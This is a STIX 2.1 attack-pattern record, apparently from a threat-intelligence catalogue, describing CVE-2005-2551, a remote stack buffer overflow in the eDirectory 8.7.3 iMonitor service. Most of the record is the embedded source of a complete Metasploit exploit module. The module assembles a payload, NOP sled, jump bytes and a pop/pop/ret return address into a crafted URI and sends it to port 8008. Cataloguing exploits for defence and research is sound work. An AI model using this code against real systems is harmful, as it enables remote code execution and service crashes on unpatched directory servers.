{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5cfd89e0-e9f5-4824-b265-34a72d0f1eb7",
    "created": "2024-08-14T16:54:57.281776Z",
    "modified": "2024-08-14T16:54:57.28178Z",
    "name": "eDirectory 8.7.3 iMonitor Remote Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in eDirectory 8.7.3 iMonitor service. This vulnerability was discovered by Peter Winter-Smith of NGSSoftware.  NOTE: repeated exploitation attempts may cause eDirectory to crash. It does not restart automatically in a default installation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/edirectory_imonitor.rb",
            "external_id": "edirectory_imonitor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2551"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /DHost\\//, /HttpStk\\// ] } # custom port\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'eDirectory 8.7.3 iMonitor Remote Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in eDirectory 8.7.3\n        iMonitor service. This vulnerability was discovered by Peter\n        Winter-Smith of NGSSoftware.\n\n        NOTE: repeated exploitation attempts may cause eDirectory to crash. It does\n        not restart automatically in a default installation.\n      },\n      'Author'         => [ 'Unknown', 'Matt Olney <scacynwrig[at]yahoo.com>' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-2551'],\n          [ 'OSVDB', '18703'],\n          [ 'BID', '14548'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 4150,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x26\\x3d\\x2b\\x3f\\x3a\\x3b\\x2d\\x2c\\x2f\\x23\\x2e\\x5c\\x30\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows (ALL) - eDirectory 8.7.3 iMonitor', { 'Ret' => 0x63501f15 } ], # pop/pop/ret\n        ],\n      'DisclosureDate' => '2005-08-11',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8008)\n      ])\n  end\n\n  def exploit\n    c = connect\n\n    # pop/pop/ret in ndsimon.dlm on our jump to our shellcode\n    uri = '/nds/' + payload.encoded + make_nops(2) + \"\\xeb\\x04\" + [target.ret].pack('V')\n    uri << \"\\xe9\\xbd\\xef\\xff\\xff\"\n    uri << \"B\" * 0xD0\n\n    res = c.send_request(c.request_raw({ 'uri' => uri }))\n    select(nil,nil,nil,4)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-08-11",
    "x_mitre_platforms": [
        "win'"
    ]
}